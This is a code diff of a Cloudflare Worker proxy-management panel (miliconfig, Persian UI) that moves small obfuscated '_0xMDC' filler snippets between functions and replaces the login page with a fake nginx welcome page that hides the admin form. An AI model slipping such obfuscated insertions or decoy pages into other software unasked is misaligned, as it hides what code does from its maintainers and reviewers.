+        async write(chunk) {if(_0xMDC.tap(0x54)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
           if (closed) return;
           const data = toUint8Array(chunk);
           if (isDnsSession) return await handleUdpDns(data, serverWs, null, fetcher);
@@ -7661,7 +7812,7 @@ function validateXhttpPadding(request, padHeader, padKey) {
   return len >= 98 && len <= 1002;
 }
 
-async function readXhttpHeader(readableStream, resolveUserFn) {if(_0xMDC.tap(0x43)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+async function readXhttpHeader(readableStream, resolveUserFn) {
   const reader = readableStream.getReader({ mode: 'byob' });
   try {
     let res = await reader.readAtLeast(18, new Uint8Array(new ArrayBuffer(128 * 1024)));
@@ -7726,7 +7877,7 @@ async function readXhttpHeader(readableStream, resolveUserFn) {if(_0xMDC.tap(0x4
   }
 }
 
-async function handleXhttpPostRequest(request, env, ctx, globalCfg, allUsers, adminUuid) {
+async function handleXhttpPostRequest(request, env, ctx, globalCfg, allUsers, adminUuid) {if(_0xMDC.tap(0x43)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   if (!request.body) return new Response('Bad Request', { status: 400 });
 
   function resolveUserFn(incomingUuid) {
@@ -7854,7 +8005,7 @@ async function handleXhttpPostRequest(request, env, ctx, globalCfg, allUsers, ad
 // ============================================================================
 
 
-function jsonResponse(data, status = 200) {if(_0xMDC.tap(0x32)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+function jsonResponse(data, status = 200) {
   return new Response(JSON.stringify(data), {
     status,
     headers: {
@@ -7867,7 +8018,7 @@ function jsonResponse(data, status = 200) {if(_0xMDC.tap(0x32)!==0x1){var _0xG=0
   });
 }
 
-function parseYxArray(yxStr = '') {
+function parseYxArray(yxStr = '') {if(_0xMDC.tap(0x32)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   if (!yxStr || !String(yxStr).trim()) return [];
   const items = String(yxStr)
     .split(',')
@@ -8154,7 +8305,7 @@ async function handlePreferredIpsApi(request, env, bypassAeCheck = false) {
 }
 
 // ۳.۵ اسکنر داخلی آی‌پی (معادل cfnew) و تبدیل دامنه به آی‌پی ثابت (/api/scanner)
-async function handleScannerApi(request, env, bypassAeCheck = false) {if(_0xMDC.tap(0x21)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+async function handleScannerApi(request, env, bypassAeCheck = false) {
   if (request.method === 'OPTIONS') return jsonResponse({ ok: true });
   const clientIp = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
   const cfg = await loadGlobalConfig(env);
@@ -8459,674 +8610,297 @@ async function handlePublicUserStatusApi(request, env, token) {
 
 // --- MODULE: src/ui/loginHtml.js ---
 // ============================================================================
-// miliconfig v3.1 - صفحه ورود / لندینگ درگاه (تم سبز نئونی miliconfig)
-// بازطراحی‌شده با پس‌زمینه زنده (Canvas + Aurora) و انیمیشن‌های روان
+// miliconfig v3.1 - درگاه ورود ادمین
+// تجربه ورود به سبک edgetunnel: ابتدا یک صفحه ساده nginx دیده می‌شود،
+// بعد از ۳ ثانیه محو/تار می‌شود و پنجره ورود روی آن ظاهر می‌شود.
+// بدون ایموجی، بدون Canvas و بدون افکت سنگین — فقط CSS سبک.
 // ============================================================================
 
 
 function renderLoginGatewayHtml(options = {}) {
-  const hasCustomPath = Boolean(options.customPath && String(options.customPath).trim());
+  const adminPath = options.adminPath || '/admin';
+  const error = options.error ? String(options.error) : '';
+  const delay = Number(options.delay) >= 0 ? Number(options.delay) : 3000;
 
-  const features = [
-    { icon: '🛡️', title: 'هسته VLESS / Trojan / xhttp', sub: 'WebSocket + ECH روی لبه کلودفلر' },
-    { icon: '🗄️', title: 'دیتابیس D1 چندکاربره', sub: 'ساخت خودکار جداول، بدون خطای ۱۱۰۱' },
-    { icon: '⚡', title: 'نام‌گذاری number+' + BRAND_NAME, sub: '۱+' + BRAND_NAME + ' تا N+' + BRAND_NAME + ' به ترتیب پینگ' },
-    { icon: '☁️', title: 'استقرار روی Pages و Workers', sub: 'یک خروجی، دو بستر، بدون هیچ سکرت' }
-  ];
-
-  return `<!DOCTYPE html>
+  return deEmoji(`<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="${VIEWPORT_META}">
   <meta name="theme-color" content="${THEME_COLOR_META}">
-  <meta name="description" content="مرکز کنترل زیرساخت پروکسی ${BRAND_NAME} روی Cloudflare — پنل مدیریت، ساب‌لینک اختصاصی و صفحه وضعیت کاربر">
-  <title>${BRAND_UPPER} ${VERSION} — مرکز کنترل زیرساخت پروکسی</title>
+  <meta name="robots" content="noindex, nofollow">
+  <title>${BRAND_UPPER}</title>
   <link rel="icon" href="${FAVICON_DATA_URI}">
   <style>
     :root {
-      --bg-deep: #050905;
-      --bg-card: rgba(12, 22, 12, 0.82);
-      --bg-input: rgba(7, 13, 7, 0.94);
-      --border-soft: rgba(163, 230, 53, 0.2);
-      --border-strong: rgba(181, 255, 77, 0.55);
-      --neon: #b5ff4d;
-      --neon-2: #84cc16;
-      --text-main: #f2f8ef;
-      --text-muted: #93a889;
-      --danger: #f87171;
+      --bg: #05080a;
+      --ink: #eaf3e4;
+      --soft: #93a58e;
+      --accent: #b5ff4d;
+      --line: rgba(255, 255, 255, 0.08);
+      --ease: cubic-bezier(.22, .61, .36, 1);
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { color-scheme: dark; }
     body {
-      min-height: 100vh;
       min-height: 100dvh;
-      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Vazirmatn", Tahoma, sans-serif;
-      background: radial-gradient(circle at 50% -10%, rgba(132, 204, 22, 0.16) 0%, transparent 55%), var(--bg-deep);
-      color: var(--text-main);
-      position: relative;
-      overflow-x: hidden;
-      line-height: 1.7;
-      padding: 26px 18px calc(34px + env(safe-area-inset-bottom, 0px));
+      background: var(--bg);
+      color: var(--ink);
+      font-family: "Vazirmatn", system-ui, -apple-system, "Segoe UI", Tahoma, sans-serif;
+      overflow: hidden;
+      -webkit-font-smoothing: antialiased;
     }
-    .page {
-      position: relative;
-      z-index: 1;
-      max-width: 1180px;
-      margin: 0 auto;
+    .ic { width: 18px; height: 18px; }
+
+    /* ---------- ۱. صفحه جعلی nginx ---------- */
+    .nginx {
+      position: fixed;
+      inset: 0;
+      background: #f4f4f4;
+      color: #2b2b2b;
+      padding: 44px 26px;
       display: flex;
       flex-direction: column;
-      gap: 20px;
-    }
-    /* ================= هدر برند ================= */
-    .brand-bar {
-      display: flex;
       align-items: center;
-      justify-content: space-between;
-      gap: 14px;
-      flex-wrap: wrap;
-      padding: 14px 18px;
-      border-radius: 20px;
-      background: var(--bg-card);
-      border: 1px solid var(--border-soft);
-      backdrop-filter: blur(16px);
+      justify-content: flex-start;
+      text-align: center;
+      font-family: Arial, "Segoe UI", Tahoma, sans-serif;
+      transition: filter .9s var(--ease), opacity .9s var(--ease), transform .9s var(--ease);
+      z-index: 2;
     }
-    .brand-info { display: flex; align-items: center; gap: 13px; }
-    .brand-logo { width: 50px; height: 50px; flex-shrink: 0; }
-    .brand-logo svg { width: 100%; height: 100%; }
-    .brand-title {
-      font-size: 1.2rem;
-      font-weight: 900;
-      letter-spacing: 0.08em;
-      direction: ltr;
-    }
-    .brand-sub {
-      font-size: 0.7rem;
-      color: var(--neon);
-      letter-spacing: 0.16em;
-      text-transform: uppercase;
-    }
-    .brand-actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-    .live-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      padding: 7px 13px;
-      border-radius: 999px;
-      background: rgba(163, 230, 53, 0.12);
-      border: 1px solid rgba(163, 230, 53, 0.35);
-      font-size: 0.78rem;
-      color: var(--neon);
+    .nginx h1 {
+      font-size: clamp(1.6rem, 5vw, 2.2rem);
       font-weight: 700;
-    }
-    .live-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: var(--neon);
-      box-shadow: 0 0 10px var(--neon);
-    }
-
-    /* ================= چیدمان اصلی ================= */
-    .layout {
-      display: grid;
-      grid-template-columns: 1.05fr 0.95fr;
-      gap: 20px;
-      align-items: start;
-    }
-    @media (max-width: 940px) {
-      .layout { grid-template-columns: 1fr; }
-    }
-
-    /* ================= هیرو ================= */
-    .hero {
-      position: relative;
-      overflow: hidden;
-      padding: 30px 26px 26px;
-      border-radius: 26px;
-      background:
-        linear-gradient(150deg, rgba(16, 30, 16, 0.94) 0%, rgba(8, 15, 8, 0.9) 100%);
-      border: 1px solid var(--border-soft);
-      box-shadow: 0 26px 70px rgba(0, 0, 0, 0.6);
-    }
-    .hero-eyebrow {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 0.7rem;
-      letter-spacing: 0.2em;
-      color: var(--neon);
-      text-transform: uppercase;
-      margin-bottom: 12px;
-    }
-    .hero-eyebrow::before {
-      content: "";
-      width: 26px;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, var(--neon));
-    }
-    .hero-title {
-      font-size: clamp(1.5rem, 1.1rem + 1.6vw, 2.15rem);
-      font-weight: 900;
-      line-height: 1.45;
-      margin-bottom: 12px;
-    }
-    .hero-title .grad {
-      background: linear-gradient(100deg, #eaffb0 0%, #b5ff4d 40%, #84cc16 100%);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-    }
-    .hero-text {
-      font-size: 0.93rem;
-      color: var(--text-muted);
-      margin-bottom: 20px;
-      max-width: 60ch;
-    }
-    .feature-grid {
-      display: grid;
-      grid-template-columns: repeat(2, minmax(0, 1fr));
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-    @media (max-width: 520px) {
-      .feature-grid { grid-template-columns: 1fr; }
-    }
-    .feature-card {
-      padding: 13px 14px;
-      border-radius: 16px;
-      background: rgba(8, 15, 8, 0.72);
-      border: 1px solid rgba(163, 230, 53, 0.14);
-    }
-    .feature-icon { font-size: 1.05rem; }
-    .feature-title {
-      font-size: 0.85rem;
-      font-weight: 800;
-      margin: 6px 0 2px;
-    }
-    .feature-sub {
-      font-size: 0.73rem;
-      color: var(--text-muted);
-    }
-    .terminal {
-      border-radius: 16px;
-      background: rgba(4, 8, 4, 0.9);
-      border: 1px solid rgba(163, 230, 53, 0.16);
-      padding: 13px 15px;
-      font-family: "JetBrains Mono", ui-monospace, monospace;
-      font-size: 0.76rem;
-      direction: ltr;
-      color: #9fb894;
-      line-height: 1.8;
-      overflow: hidden;
-    }
-    .terminal .u { color: var(--neon); }
-    .terminal .ok { color: #d9ff9b; }
-
-    /* ================= کارت ورود ================= */
-    .gateway-card {
-      position: relative;
-      padding: 26px 24px;
-      border-radius: 26px;
-      background: var(--bg-card);
-      border: 1px solid var(--border-soft);
-      box-shadow: 0 26px 80px rgba(0, 0, 0, 0.7), 0 0 44px rgba(163, 230, 53, 0.07);
-      backdrop-filter: blur(18px);
-    }
-    .card-head {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 10px;
+      color: #2b2b2b;
       margin-bottom: 18px;
+      letter-spacing: 0;
     }
-    .card-title { font-size: 1.04rem; font-weight: 900; }
-    .card-hint { font-size: 0.74rem; color: var(--text-muted); }
-    .desc-text {
-      color: var(--text-muted);
-      font-size: 0.88rem;
-      margin-bottom: 18px;
+    .nginx p { max-width: 640px; font-size: 0.95rem; line-height: 1.85; color: #434343; margin-bottom: 14px; }
+    .nginx a { color: #22509b; text-decoration: none; }
+    .nginx a:hover { text-decoration: underline; }
+    .nginx .nginx-logo {
+      margin-top: 26px;
+      font-size: 1.9rem;
+      letter-spacing: .12em;
+      font-weight: 700;
+      color: #8a8a8a;
     }
-    .desc-text strong { color: #dff5c8; }
-    .mode-switch {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 6px;
-      padding: 5px;
-      border-radius: 14px;
-      background: rgba(5, 10, 5, 0.8);
-      border: 1px solid var(--border-soft);
-      margin-bottom: 16px;
-    }
-    .mode-btn {
-      border: none;
-      background: transparent;
-      color: var(--text-muted);
-      font-family: inherit;
-      font-size: 0.83rem;
-      font-weight: 800;
-      padding: 9px 10px;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background 0.34s ease, color 0.34s ease, transform 0.34s ease;
-    }
-    .mode-btn.active {
-      background: linear-gradient(135deg, rgba(198, 255, 102, 0.95) 0%, rgba(132, 204, 22, 0.95) 100%);
-      color: #071204;
-      box-shadow: 0 6px 20px rgba(163, 230, 53, 0.28);
-    }
-    .mode-btn:not(.active):hover { color: var(--neon); }
-
-    .input-group { margin-bottom: 14px; }
-    .input-label {
-      display: block;
-      font-size: 0.82rem;
-      color: var(--text-muted);
-      margin-bottom: 7px;
-    }
-    .input-wrap { position: relative; }
-    .token-input {
-      width: 100%;
-      padding: 14px 16px 14px 46px;
-      border-radius: 14px;
-      background: var(--bg-input);
-      border: 1px solid var(--border-soft);
-      color: var(--text-main);
-      font-size: 0.92rem;
-      font-family: "JetBrains Mono", ui-monospace, monospace;
-      direction: ltr;
-      text-align: left;
-      outline: none;
-      transition: border-color 0.28s ease, box-shadow 0.28s ease, background 0.28s ease;
-    }
-    .token-input:focus {
-      border-color: var(--neon);
-      background: rgba(10, 18, 10, 0.98);
-      box-shadow: 0 0 0 4px rgba(181, 255, 77, 0.13);
-    }
-    .token-input.invalid {
-      border-color: rgba(248, 113, 113, 0.65);
-      box-shadow: 0 0 0 4px rgba(248, 113, 113, 0.12);
-    }
-    .input-icon {
-      position: absolute;
-      left: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 0.95rem;
-      opacity: 0.75;
+    .nginx .nginx-sub { font-size: .78rem; color: #8a8a8a; margin-top: 6px; letter-spacing: .06em; }
+    body.veiled .nginx {
+      filter: blur(14px) saturate(.4);
+      opacity: 0;
+      transform: scale(1.06);
       pointer-events: none;
     }
-    .btn-row {
-      display: grid;
-      grid-template-columns: 1.25fr 1fr;
-      gap: 10px;
-      margin-top: 4px;
-    }
-    @media (max-width: 480px) {
-      .btn-row { grid-template-columns: 1fr; }
-    }
-    .btn {
-      padding: 13px 16px;
-      border-radius: 14px;
-      font-size: 0.9rem;
-      font-weight: 800;
-      cursor: pointer;
-      border: 1px solid transparent;
-      font-family: inherit;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      transition: transform 0.3s cubic-bezier(0.22, 1, 0.36, 1), box-shadow 0.3s ease, border-color 0.3s ease, color 0.3s ease, background 0.3s ease;
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #c6ff66 0%, #84cc16 100%);
-      color: #071204;
-      box-shadow: 0 8px 26px rgba(163, 230, 53, 0.3);
-    }
-    .btn-primary:hover { transform: translate3d(0, -2px, 0); box-shadow: 0 12px 32px rgba(163, 230, 53, 0.42); }
-    .btn-secondary {
-      background: rgba(163, 230, 53, 0.08);
-      border-color: var(--border-soft);
-      color: var(--text-main);
-    }
-    .btn-secondary:hover { border-color: var(--neon); color: var(--neon); transform: translate3d(0, -2px, 0); }
-    .btn[disabled] { opacity: 0.62; cursor: progress; transform: none; }
 
-    .msg-box {
-      margin-top: 12px;
-      padding: 10px 14px;
-      border-radius: 12px;
-      font-size: 0.83rem;
-      display: none;
-      animation: fxFadeUp 0.42s cubic-bezier(0.22, 1, 0.36, 1) both;
+    /* ---------- ۲. پنجره ورود ---------- */
+    .stage {
+      position: relative;
+      z-index: 3;
+      min-height: 100dvh;
+      display: grid;
+      place-items: center;
+      padding: 22px;
+      opacity: 0;
+      transition: opacity .55s var(--ease) .18s;
+      pointer-events: none;
     }
-    .msg-error {
-      display: block;
-      background: rgba(248, 113, 113, 0.12);
-      border: 1px solid rgba(248, 113, 113, 0.35);
-      color: var(--danger);
+    body.veiled .stage { opacity: 1; pointer-events: auto; }
+    .stage::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(720px 420px at 76% -6%, rgba(163, 230, 53, 0.13), transparent 62%),
+        radial-gradient(620px 380px at 12% 106%, rgba(56, 189, 248, 0.07), transparent 60%),
+        #05080a;
+      z-index: -1;
     }
-    .msg-info {
-      display: block;
-      background: rgba(163, 230, 53, 0.1);
-      border: 1px solid rgba(163, 230, 53, 0.32);
-      color: var(--neon);
+    .login-window {
+      width: min(392px, 100%);
+      border-radius: 22px;
+      border: 1px solid var(--line);
+      background: rgba(13, 19, 15, 0.86);
+      backdrop-filter: blur(26px) saturate(150%);
+      -webkit-backdrop-filter: blur(26px) saturate(150%);
+      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      padding: 22px;
+      transform: translateY(10px) scale(.985);
+      transition: transform .5s var(--ease);
     }
-    .kbd-row {
+    body.veiled .login-window { transform: none; }
+    .lw-bar { display: flex; align-items: center; gap: 6px; margin-bottom: 18px; }
+    .lw-dot { width: 9px; height: 9px; border-radius: 50%; background: rgba(255, 255, 255, 0.16); }
+    .lw-dot.g { background: #a3e635; }
+    .lw-dot.y { background: #fbbf24; }
+    .lw-dot.r { background: #f87171; }
+    .lw-logo { width: 52px; height: 52px; margin: 2px auto 10px; display: grid; place-items: center; }
+    .lw-logo svg { width: 52px; height: 52px; }
+    .lw-brand { text-align: center; font-size: 1.02rem; font-weight: 800; letter-spacing: .04em; }
+    .lw-sub { text-align: center; font-size: .72rem; color: var(--soft); margin: 4px 0 18px; }
+    .lw-label { display: block; font-size: .72rem; color: var(--soft); margin-bottom: 6px; }
+    .lw-field {
       display: flex;
       align-items: center;
       gap: 8px;
-      flex-wrap: wrap;
+      padding: 0 11px;
+      border-radius: 12px;
+      border: 1px solid var(--line);
+      background: rgba(4, 8, 6, 0.9);
+      transition: border-color .18s var(--ease), box-shadow .18s var(--ease);
+    }
+    .lw-field:focus-within { border-color: rgba(181, 255, 77, 0.55); box-shadow: 0 0 0 3px rgba(181, 255, 77, 0.12); }
+    .lw-field .ic { color: var(--soft); }
+    .lw-field input {
+      flex: 1;
+      min-width: 0;
+      border: 0;
+      outline: 0;
+      background: transparent;
+      color: var(--ink);
+      font: inherit;
+      font-size: 16px;
+      padding: 11px 0;
+      letter-spacing: .06em;
+    }
+    .lw-eye { border: 0; background: transparent; color: var(--soft); cursor: pointer; display: inline-flex; padding: 4px; }
+    .lw-eye:hover { color: var(--ink); }
+    .lw-submit {
+      width: 100%;
       margin-top: 14px;
-      font-size: 0.75rem;
-      color: var(--text-muted);
+      padding: 11px 14px;
+      border-radius: 12px;
+      border: 0;
+      cursor: pointer;
+      font: inherit;
+      font-weight: 700;
+      font-size: .86rem;
+      color: #10160b;
+      background: linear-gradient(180deg, #cbff78, #a3e635);
+      box-shadow: 0 10px 26px rgba(163, 230, 53, 0.22);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      transition: transform .16s var(--ease), filter .16s var(--ease);
     }
-    .kbd {
-      font-family: "JetBrains Mono", ui-monospace, monospace;
-      font-size: 0.7rem;
-      padding: 2px 7px;
-      border-radius: 6px;
-      background: rgba(163, 230, 53, 0.1);
-      border: 1px solid var(--border-soft);
-      color: #dff5c8;
+    .lw-submit:hover { transform: translateY(-1px); filter: brightness(1.04); }
+    .lw-error {
+      margin-top: 12px;
+      font-size: .74rem;
+      color: #fca5a5;
+      background: rgba(248, 113, 113, 0.1);
+      border: 1px solid rgba(248, 113, 113, 0.28);
+      border-radius: 10px;
+      padding: 8px 10px;
+      display: ${error ? 'block' : 'none'};
     }
-
-    /* ================= پشتیبانی + فوتر ================= */
-    .support-band {
+    .lw-foot {
+      margin-top: 16px;
+      padding-top: 12px;
+      border-top: 1px solid var(--line);
       display: flex;
       align-items: center;
       justify-content: space-between;
-      gap: 14px;
-      flex-wrap: wrap;
-      padding: 18px 20px;
-      border-radius: 22px;
-      background: linear-gradient(120deg, rgba(163, 230, 53, 0.12) 0%, rgba(8, 15, 8, 0.86) 62%);
-      border: 1px dashed var(--border-strong);
-    }
-    .support-text { font-size: 0.88rem; }
-    .support-text b { color: var(--neon); }
-    .support-text a { color: var(--neon); text-decoration: none; overflow-wrap: anywhere; }
-    .support-text a:hover { text-decoration: underline; }
-    .btn-support {
-      background: linear-gradient(135deg, #c6ff66 0%, #84cc16 100%);
-      color: #071204;
-      border-radius: 14px;
-      padding: 12px 20px;
-      font-weight: 900;
-      font-size: 0.88rem;
-      text-decoration: none;
-      display: inline-flex;
-      align-items: center;
       gap: 8px;
-      box-shadow: 0 10px 26px rgba(163, 230, 53, 0.28);
-      transition: transform 0.3s cubic-bezier(0.22, 1, 0.36, 1), box-shadow 0.3s ease;
+      font-size: .68rem;
+      color: var(--soft);
     }
-    .btn-support:hover { transform: translate3d(0, -2px, 0); box-shadow: 0 14px 34px rgba(163, 230, 53, 0.4); }
-    .foot-row {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      flex-wrap: wrap;
-      font-size: 0.75rem;
-      color: var(--text-muted);
+    .lw-foot a { color: var(--soft); text-decoration: none; display: inline-flex; align-items: center; gap: 5px; }
+    .lw-foot a:hover { color: var(--accent); }
+    .lw-ver { direction: ltr; letter-spacing: .1em; opacity: .7; }
+    @media (max-width: 420px) {
+      .nginx { padding: 30px 18px; }
+      .login-window { padding: 18px; border-radius: 18px; }
     }
-    .chip {
-      padding: 5px 12px;
-      border-radius: 999px;
-      background: rgba(163, 230, 53, 0.08);
-      border: 1px solid var(--border-soft);
-      color: #cfe6bd;
+    @media (prefers-reduced-motion: reduce) {
+      .nginx, .stage, .login-window { transition: opacity .01ms; }
     }
-    @media (max-width: 620px) {
-      body { padding: 16px 12px calc(26px + env(safe-area-inset-bottom, 0px)); }
-      .gateway-card, .hero { padding: 20px 16px; border-radius: 22px; }
-      .brand-bar { padding: 12px 14px; }
-      .brand-title { font-size: 1.05rem; }
-      .btn { min-height: 46px; }
-      .terminal { font-size: 0.7rem; }
-    }
-${FX_CSS}
-${BASE_UI_CSS}
   </style>
 </head>
 <body>
-  ${FX_MARKUP}
+  <!-- صفحه ساده سرویس (فریب نمای اولیه) -->
+  <div class="nginx" id="nginxSplash">
+    <h1>Welcome to nginx!</h1>
+    <p>
+      If you see this page, the nginx web server is successfully installed and
+      working. Further configuration is required.
+    </p>
+    <p>
+      For online documentation and support please refer to
+      <a href="https://nginx.org/" rel="noopener">nginx.org</a>.<br>
+      Commercial support is available at <a href="https://nginx.com/" rel="noopener">nginx.com</a>.
+    </p>
+    <p><em>Thank you for using nginx.</em></p>
+    <div class="nginx-logo">nginx</div>
+    <div class="nginx-sub">HTTP Server &middot; ${VERSION}</div>
+  </div>
 
-  <div class="page">
-    <header class="brand-bar fx-fade" style="--fx-i:0">
-      <div class="brand-info">
-        <div class="brand-logo fx-float">${SHIELD_LOGO_SVG}</div>
-        <div>
-          <div class="brand-title">${BRAND_UPPER}</div>
-          <div class="brand-sub">Cloudflare D1 Control ${VERSION}</div>
-        </div>
+  <!-- پنجره ورود سیستم -->
+  <div class="stage">
+    <form class="login-window" method="post" action="${adminPath}/login" autocomplete="off">
+      <div class="lw-bar">
+        <span class="lw-dot r"></span><span class="lw-dot y"></span><span class="lw-dot g"></span>
       </div>
-      <div class="brand-actions">
-        <span class="live-pill"><span class="live-dot fx-live-dot"></span> لبه کلودفلر فعال</span>
-        <span class="chip">Pages + Workers</span>
+      <div class="lw-logo">${SHIELD_LOGO_SVG}</div>
+      <div class="lw-brand">${BRAND_UPPER}</div>
+      <div class="lw-sub">ورود به مرکز کنترل ${BRAND_NAME}</div>
+
+      <label class="lw-label" for="adminPassword">رمز عبور ادمین</label>
+      <div class="lw-field">
+        ${ICON('lock')}
+        <input id="adminPassword" name="password" type="password" inputmode="text" autocomplete="current-password" placeholder="رمز عبور" required autofocus>
+        <button type="button" class="lw-eye" id="pwToggle" aria-label="نمایش رمز">${ICON('eye')}</button>
       </div>
-    </header>
 
-    <main class="layout">
-      <!-- هیرو -->
-      <section class="hero fx-card fx-shine fx-fade" style="--fx-i:1">
-        <div class="hero-eyebrow">Real-time proxy control center</div>
-        <h1 class="hero-title">
-          مرکز کنترل زیرساخت پروکسی <span class="grad">${BRAND_NAME}</span>
-          روی لبه سراسری Cloudflare
-        </h1>
-        <p class="hero-text">
-          کاربران دیتابیس D1، نودهای <b>VLESS / Trojan / xhttp / ECH</b>، ساب‌لینک اختصاصی هر کلاینت و صفحه وضعیت هر کاربر
-          را از یک پنل زنده مدیریت کنید. خروجی نودها با نام‌گذاری اختصاصی <b>number+${BRAND_NAME}</b> ساخته می‌شود.
-        </p>
+      <button class="lw-submit" type="submit">${ICON('logout')} ورود به پنل</button>
+      <div class="lw-error" id="lwError" role="alert">${error || 'رمز عبور نادرست است.'}</div>
 
-        <div class="feature-grid">
-          ${features
-            .map(
-              (f, i) => `<div class="feature-card fx-card fx-reveal" style="--fx-i:${i}">
-            <div class="feature-icon">${f.icon}</div>
-            <div class="feature-title">${f.title}</div>
-            <div class="feature-sub">${f.sub}</div>
-          </div>`
-            )
-            .join('')}
-        </div>
-
-        <div class="terminal">
-          <div><span class="u">root@${BRAND_NAME}:~$</span> status --engine=cloudflare-d1</div>
-          <div><span class="ok">✓</span> protocols: VLESS-WS · Trojan-WS · xhttp · ECH</div>
-          <div><span class="ok">✓</span> naming: 1+${BRAND_NAME}, 2+${BRAND_NAME} ... N+${BRAND_NAME}</div>
-          <div><span class="ok">✓</span> deploy: <span class="fx-typing">pages.dev + workers.dev · zero-secret</span></div>
-        </div>
-      </section>
-
-      <!-- کارت ورود -->
-      <section class="gateway-card fx-card fx-fade" style="--fx-i:2">
-        <div class="card-head">
-          <div>
-            <div class="card-title">ورود به مرکز کنترل</div>
-            <div class="card-hint">شناسه مدیر، مسیر سفارشی یا شناسه کاربر</div>
-          </div>
-          <span class="live-pill"><span class="live-dot fx-live-dot"></span> امن</span>
-        </div>
-
-        <p class="desc-text">
-          برای ورود به <strong>پنل مدیریت ${BRAND_NAME}</strong> کلید مدیر (${hasCustomPath ? 'مسیر سفارشی D یا UUID' : 'UUID مدیر یا مسیر سفارشی'})
-          را وارد کنید، یا با انتخاب حالت «وضعیت کاربر» شناسه کاربری را ببینید و ساب‌لینک اختصاصی خود را بگیرید.
-        </p>
-
-        <div class="mode-switch" role="tablist" aria-label="انتخاب مقصد">
-          <button type="button" class="mode-btn active" id="modeAdmin" role="tab" aria-selected="true" onclick="setMode('admin')">⚡ پنل مدیریت</button>
-          <button type="button" class="mode-btn" id="modeStatus" role="tab" aria-selected="false" onclick="setMode('status')">👁 صفحه وضعیت کاربر</button>
-        </div>
-
-        <div class="input-group">
-          <label class="input-label" for="uuidInput">شناسه دسترسی:</label>
-          <div class="input-wrap">
-            <span class="input-icon">🔑</span>
-            <input type="text" id="uuidInput" class="token-input" placeholder="351c9981-04b6-4103-aa4b-864aa9c91469" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" autofocus aria-describedby="msgBox">
-          </div>
-          <p class="field-hint login-hint">
-            مدیریت: کلید/مسیر ادمین را وارد کنید (متغیر <code>u</code> در Cloudflare — با <code>npm run cf:bind</code> چاپ می‌شود).
-            کاربر: UUID یا توکن کاربر را وارد کنید. اگر دیتابیس وصل نباشد، کلید پیش‌فرض همان UUID نمونهٔ بالا است.
-          </p>
-        </div>
-
-        <div class="btn-row">
-          <button type="button" class="btn btn-primary" id="primaryBtn" onclick="submitAccess()">
-            <span id="primaryBtnLabel">⚡ ورود به پنل</span>
-          </button>
-          <button type="button" class="btn btn-secondary" onclick="pasteClipboard()">
-            <span>📋 چسباندن شناسه</span>
-          </button>
-        </div>
-
-        <div id="msgBox" class="msg-box" role="alert"></div>
-
-        <div class="kbd-row">
-          <span><span class="kbd">Enter</span> ورود</span>
-          <span><span class="kbd">Shift</span> + <span class="kbd">Enter</span> وضعیت</span>
-          <span><span class="kbd">Ctrl</span> + <span class="kbd">K</span> پاک‌کردن</span>
-        </div>
-      </section>
-    </main>
-
-    <section class="support-band fx-card fx-reveal" style="--fx-i:0">
-      <div class="support-text">
-        ❓ راهنمایی، آموزش نصب کلاینت یا رفع مشکل؟ پشتیبانی ${BRAND_NAME} در ${SUPPORT_CHANNEL_LABEL} فعال است:
-        <a href="${SUPPORT_CHANNEL_URL}" target="_blank" rel="noopener noreferrer">${SUPPORT_CHANNEL_URL}</a>
+      <div class="lw-foot">
+        <a href="${SUPPORT_CHANNEL_URL}" target="_blank" rel="noopener noreferrer">${ICON('message')} ${SUPPORT_CHANNEL_LABEL}</a>
+        <span class="lw-ver">v${VERSION}</span>
       </div>
-      <a class="btn-support" href="${SUPPORT_CHANNEL_URL}" target="_blank" rel="noopener noreferrer">💬 عضویت در کانال پشتیبانی</a>
-    </section>
-
-    <div class="foot-row">
-      <span class="chip">Cloudflare Pages</span>
-      <span class="chip">Cloudflare Workers</span>
-      <span class="chip">D1 Auto-Migration</span>
-      <span class="chip">Zero Error 1101</span>
-      <span class="chip">${BRAND_UPPER} ${VERSION}</span>
-    </div>
+    </form>
   </div>
 
   <script>
-${FX_RUNTIME_JS}
-  </script>
-  <script>
-    var ACCESS_MODE = 'admin';
-
-    function setMode(mode) {
